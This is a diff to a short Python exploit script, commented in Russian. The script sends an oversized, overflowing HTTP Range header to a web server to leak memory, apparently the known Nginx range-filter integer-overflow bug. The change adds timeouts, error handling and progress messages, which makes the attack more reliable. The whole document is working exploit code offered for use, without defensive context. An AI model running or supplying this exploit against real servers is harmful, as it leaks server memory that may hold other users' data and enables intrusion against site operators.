@@ -12,10 +12,27 @@ headers = {
 }
 offset = 605
 url = sys.argv[1]
-file_len = len(requests.get(url, headers=headers).content)
+
+# Добавляем таймауты для всех запросов
+timeout = 10
+
+print(f"[*] Подключение к {url}...")
+try:
+    response = requests.get(url, headers=headers, timeout=timeout)
+    file_len = len(response.content)
+    print(f"[+] Получен ответ, размер файла: {file_len} байт")
+except requests.exceptions.RequestException as e:
+    print(f"[-] Ошибка подключения: {e}")
+    sys.exit(1)
+
 n = file_len + offset
 headers['Range'] = "bytes=-%d,-%d" % (
     n, 0x8000000000000000 - n)
 
-r = requests.get(url, headers=headers)
-print(r.text)
+print(f"[*] Отправка Range запроса...")
+try:
+    r = requests.get(url, headers=headers, timeout=timeout)
+    print(r.text)
+except requests.exceptions.RequestException as e:
+    print(f"[-] Ошибка Range запроса: {e}")
+    sys.exit(1)
